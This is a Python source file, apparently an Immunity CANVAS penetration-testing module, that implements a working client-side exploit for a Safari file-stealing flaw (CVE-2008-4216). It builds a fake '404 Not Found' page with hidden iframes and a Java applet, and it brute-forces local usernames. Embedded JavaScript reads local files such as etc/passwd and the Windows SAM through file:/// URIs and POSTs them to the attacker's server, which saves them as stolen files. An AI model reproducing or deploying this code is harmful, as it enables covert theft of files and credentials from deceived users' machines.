#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2009
# http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from httpclientside import httpclientside
import base64
from tcpexploit import *

NAME                            = "Safari < 3.2 File Stealing"
DESCRIPTION                     = "Steal files from target machine through Safari local file:/// URI"
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Apple"
DOCUMENTATION["Repeatability"]  = "Infinite (client side - no crash)"
DOCUMENTATION["CVE Name"]       = "CVE-2008-4216"
DOCUMENTATION["CVE Url"]        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4216"
DOCUMENTATION['CVSS'] = 4.3
DOCUMENTATION["A Warning"]      = "Due to the nature of this exploit, a file (error.html) will be left behind on the target system"

DOCUMENTATION["NOTES"]="""There are a lot of things working together in this exploit. Each stage of the attack is outlined as follows:

1 - A target is somehow enticed to browse to our server that hosts the exploit.
2 - An html page with 2 embedded iframes and a malicious Java applet is loaded into the target browser
3 - iframe number 1 makes a GET request for error.html
4 - When the request is made SPIKEproxy sends an invalid Content-Type header to force Safari to download the file to a 'known' location
5 - The Java applet abuses the vulnerable showDocument() function to load the malicious error.html file at the 'known' location
    -The user either supplied a known user name or a list of possible user names to brute force
    -A trick was used to make all the brute forcing take place in the second (invisible) iframe so the target will not see anything
    -You may want to try running the CANVAS userenum module against a windows target in attempt to enumerate valid user names
6 - Once the Java applet has successfully found the malicious error.html it executes the javascript inside that iterates through the list
    of files the user supplied to be stolen.  Any type of files can be stolen as the javascript will convert even binary files (exe/pdf/doc) for flawless
    transport over the network back to us.
7 - Once SPIKEproxy sees a POST request with ?file= in the request, it will parse a custom 'filename' header and convert and dump that file
    into Reports/<current session name>/stolen_files folder. 

The only difficulty in exploiting this is that we might not know the usernames that are in use on the target systems which is needed to make a call 
to the downloaded error.html file.  

Due to all the 'moving parts' involved in this exploit - it is best to run it from the httpserver module.  You will need to supply arguments to the httpserver
module when using this exploit.  All possible arguments are listed below"""

DOCUMENTATION["Arguments"]="""

In the Resources/safari_file_stealing folder you will find usernames.txt and filelist.txt - those files are where you will put your
usernames to try the files you would like to steal - each file should be on its own line without the drive letter and without the 
beginning slashes as follows:

        WINDOWS/system32/calc.exe
        Documents and Settings/Administrator/Desktop/some.pdf
        etc/passwd
        
each user name should be on its own line in the file as follows:

        Administrator
        bob
        root     
        
singleuser:<a single user name to try>
    singleuser:Administrator
    
singlefile:<a single file to steal> (starting with the file name only. The drive letter and slashes are handled internally)
    singlefile:somefile.txt (will target the file <drive letter>:\\somefile.txt)
    singlefile:somefolder/somefile.txt (will target the file <drive letter>:\\somefolder\\somefile.txt)
   
os:<target os>
    os:mac
    os:windows
    
driveletter:<the target drive letter on which the interesting files are stored> (windows only - default:c)
    driveletter:c
    driveletter:d
    
"""
#DOCUMENTATION["Argument Examples from files"]="usernamefile:usernames.txt filelist:stealthese.txt os:windows"
#DOCUMENTATION["Argument Examples using single username and file Win32"]="singleuser:Administrator singlefile:\\\\windows\\\\repair\\\\sam os:windows"
#DOCUMENTATION["Argument Examples using single username and file Mac OS"]="singleuser:maclover singlefile:etc/passwd os:mac"

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Clientside"
PROPERTY['ARCH']                = [ ["UNIX"], ["Windows"] ]
PROPERTY['VERSION']             = []
PROPERTY['DELIVERY']            = 'HTTP'

TARGETS = { 0 : ['Safari < 3.2'] }

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version            = 0
        self.name               = NAME
        self.htmlfile           = "index.html"
        # filename is used in the actual http server
        self.filename           = self.htmlfile
        self.username           = "Administrator"
        self.sourcedir          = os.path.join("Resources","safari_file_stealing")
        self.jarfile            = "SafariError.jar"
        self.usernamefile       = os.path.join(self.sourcedir, "usernames.txt")
        self.filestostealfile   = os.path.join(self.sourcedir, "filelist.txt")
        # in standalone mode we want it to adhere
        # to manually chosen callback settings ...
        self.autoFind           = False
        return

    def getargs(self):
        self.host              = self.target.interface
        self.htmlfile          = self.argsDict.get('htmlfile', self.htmlfile)
        self.singleusername    = self.argsDict.get('username', self.singleusername)
        self.usernamefile      = self.argsDict.get('usernamefile', self.username)
        self.filestostealfile  = self.argsDict.get('filelist', self.filestostealfile)
        self.serverhostip      = self.argsDict.get('serverhostip', self.serverhostip)
        self.serverhostport    = self.argsDict.get('serverhostport', self.serverhostport)
        html                   = self.makefile()
        rar                    = self.makedownloadfile()
    
    def displayVersions(self):
        for t in TARGETS.keys():
            print "%d: %s" % (t, TARGETS[t][0])
        return

    def neededListenerTypes(self):
        return []
    
    def run(self):
        
        #In order for someone to run this attack standalone would mean they would have to 
        #be in control of a server to host error.html and play with the Content-Type headers
        #to force the download to the known location.  SPIKEproxy does all that for us in this module
        self.log("Please read the description and run this module from httpserver")
        return 0 
    
    ## SPIKE Proxy Callbacks ...

    def makedownloadfile(self):
        jar=os.path.join(self.sourcedir,self.jarfile)
        return file(jar, 'rb').read()
    
    def makeourfile(self):
        return file(self.ourhtmlfile, 'r').read()
    
    def makefilestealinghtml(self):
        
        if self.singlefiletosteal !="":
            filestosteal="""wfiles[0]="%s";\n"""%self.singlefiletosteal
        elif self.filestostealfile !="":
            patch=""
            count=0
            for line in file(self.filestostealfile, "r").readlines():
                patch+="""wfiles[%s]="%s";\n"""%(str(count), line.strip())
                count+=1
            filestosteal=patch
        if self.platform.lower()=="w" or self.platform.lower()=="windows":
            grabber="""try{
            req.open('GET', 'file:///%s:\\\\'+wfiles[i], false);
            req.overrideMimeType('text/plain; charset=x-user-defined');
            req.send();
            }catch(e){}"""%self.driveletter
        
        elif self.platform.lower()=="m" or self.platform.lower()=="mac":
            grabber="""try{
            req.open('GET', 'file:///'+wfiles[i], false);
            req.overrideMimeType('text/plain; charset=x-user-defined');
            req.send();
            }catch(e){}"""
            
        html="""
        <html>
        <head>
                <title>404 Not Found</title>
            </head>
            <body>
            <h1>Not Found</h1>
            <p>The requested URL /index.html was not found on this server.</p>
            <hr>
              
<script>
var req  = new XMLHttpRequest();
var req2 = new XMLHttpRequest();
req.onreadystatechange = processReqChange;
var wfiles = new Array();
var buffer = new Array();
var i,j,t;
%s


for(i=0;i<wfiles.length;i++){

        filename=wfiles[i];

        %s
        
}

function processReqChange(){

	if (req.readyState == 4){

		stuff=req.responseText;
		req2.open('POST', "http://%s:%d/?file=", false);
		req2.setRequestHeader("filename", filename);

		for(j=0;j<=req.responseText.length;j++){
                    var char = req.responseText.substring(j,j+1);
                    var abyte = req.responseText.charCodeAt(j) & 0xff;
                    buffer[j]=abyte;
                    }

		req2.send(buffer);

		}
	}

</script>
</body>
</html>"""%(filestosteal,
            grabber,
            self.bindip,
            self.port)

        #self.log(html)
        return html
        
    
    def enumusers(self, ip):
        self.log("Attempting to enumerate user names on %s"%ip)
        exploit=self.engine.getModuleExploit("userenum")
        exploit.link(self)
        exploit.argsDict.set("startrid",500)
        exploit.argsDict.set("systemname","\\\\%s"%ip)
        #we not only want the admins at around 500 but the regular users above 1000
        exploit.argsDict.set("endrid",1050)
        exploit.run()
    
    def makefile(self):
        #need to configure how our java applet will behave. the vulnerable behavior in Safari
        #unfortunately doesn't allow us to reliably try each supplied username *without* opening
        #a new window for each attempted username - but using a simple trick I forward that activity into 
        #a hidden iframe inside the page.
        if self.singleuser !="":
            username="""<param name="0" value="%s">\n"""%self.singleuser.strip()
            username+="""<param name="b" value="0">\n"""
            username+="""<param name="count" value="1">\n"""
        elif self.usernamefile !="":
            patch=""
            count=0
            for line in file(self.usernamefile, "r").readlines():
                patch+="""<param name="%s" value="%s">\n"""%(str(count), line.strip())
                count+=1
            username=patch
            username+="""<param name="b" value="1">\n"""
            username+="""<param name="count" value="%s">\n"""%str(count)
        else:
            self.log("No user name set!!!! Please read the description for this attack")
            
        if self.platform !="":
            if self.platform.lower()=="w" or self.platform.lower()=="windows":
                username+="""<param name="o" value="1">\n"""
            elif self.platform.lower()=="m" or self.platform.lower()=="mac":
                username+="""<param name="o" value="2">\n"""
        else:
            self.log("No platform selected!!!! Please read the description for this attack")
            
        html = """
        <html>
            <head>
                <title>404 Not Found</title>
            </head>
            <body>
                <!-- Site 404 Handler Applet -->
                <iframe src="http://%s:%d/error.html" width=0 height=0 style="visibility: hidden; display: none">
                </iframe>
                <applet archive="%s" code="safarierror/FileNotFound.class" width="0" height="0">
                    %s
                </applet>
                <iframe name="notfound" width=0 height=0 style="visibility: hidden; display: none"></iframe>
                <h1>Not Found</h1>
                <p>The requested URL /%s was not found on this server.</p>
                <hr>
            </body>
        </html>
        """ % (self.bindip,\
               self.port,\
               self.jarfile,\
               username,\
               self.htmlfile,\
               )
        #self.log(html)
        return html
        
    def makesploit(self, clientheader, clientbody):
        #self.run()
        # we are platform independent
        from libs.spkproxy import header, body
        import struct
        h           = header('SERVER')
        b           = body()
        user_agent  = clientheader.getStrValue(['User-Agent'])
        GET         = clientheader.URL
        
        if hasattr(self, "clientsideargs"):
            self.log(self.clientsideargs)
            self.bindip            = self.clientsideargs["bindip"]
            self.port              = self.clientsideargs["bindport"]
            #these may or may not be set by the user
            """
            try:
                self.usernamefile      = self.clientsideargs["user_supplied_args"]["usernamefile"]
                self.log("using user name list: %s"%self.usernamefile)
            except:
                self.usernamefile      = ""
            try:
                self.filestostealfile  = self.clientsideargs["user_supplied_args"]["filelist"]
                self.log("using file list: %s"%self.filestostealfile)
            except:
                self.filestostealfile  = ""
            """
            try:
                self.singleuser        = self.clientsideargs["user_supplied_args"]["singleuser"]
                self.log("using single user name: %s"%self.singleuser)
            except:
                self.singleuser        = ""
            try:
                self.singlefiletosteal = self.clientsideargs["user_supplied_args"]["singlefile"]
                self.log("try to steal single file: %s"%self.singlefiletosteal)
            except:
                self.singlefiletosteal = ""
            try:
                self.platform = self.clientsideargs["user_supplied_args"]["os"]
                self.log("target platform: %s"%self.platform)
            except:
                self.platform = ""
            try:
                self.driveletter = self.clientsideargs["user_supplied_args"]["driveletter"]
                self.log("target drive letter: %s"%self.driveletter)
            except:
                self.driveletter = "c"
           
        else:
            self.log("we shouldn't be run standalone!")

       
        self.log("[+] User agent of connecting host: %s" % user_agent)
        
        
        if "?file=" in clientheader.URL:
            #got a POST
            data=clientheader.data
            post=clientbody.data
            #self.log("HEADER %s"%"".join(data))
            #self.log("DATA %s"%"".join(post))

            filename=clientheader.getHeaderValue("Filename")
            filename=filename.replace("\\","_").replace(" ","_").replace("/","_")
            self.log("\n\nstole %s from the target system - dumping into local file\n"%filename)

            #we don't know the ip of the target yet in order to create the directory but
            #for now it will at least end up in the correct session directory.
            outputdir = self.output(ip="stolen_files", subdir="stolen_files")
            filename=os.path.join(outputdir,filename)
            outfile=file(filename,"wb")

            #self.log(post)
            #in order to keep the javascript small we simply convert each byte in each stolen file
            #to a decimal and pass the comma seperated buffer back to us for processing.
            
            raw="".join(post)
            raw=raw.split(",")
            for c in raw:
                outfile.write(struct.pack("B",int(c)))

            outfile.close()
            
        elif clientheader.URL == "/error.html":
            self.log("SERVING error.html as an invalid content-type to force download to the desktop")
            header=header('SERVER')
            h.addHeader('Content-Type','application/force-download')
            h.addHeader('Content-Disposition','attachment; filename=error.html')
            b.setBody(self.makefilestealinghtml())
            return h,b
            
        elif clientheader.URL.count(self.htmlfile):
            self.log("[+] Sending HTML")
            b.setBody(self.makefile())
            
        elif clientheader.URL.count(self.jarfile):
            self.log("[+] Sending JAR")
            data = self.makedownloadfile()
            self.log("[+] Sending %d bytes" % len(data))
            h.addHeader('Content-type', 'binary/octet-stream')
            h.addHeader('Connection', 'close')
            b.setBody(data)

        else:
            self.log("[+] Redirect to %s" % self.htmlfile)
            h.status = '302'
            h.addHeader('Location', self.htmlfile)
            h.addHeader('Content-Type', 'text/html')

        return h,b

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
    
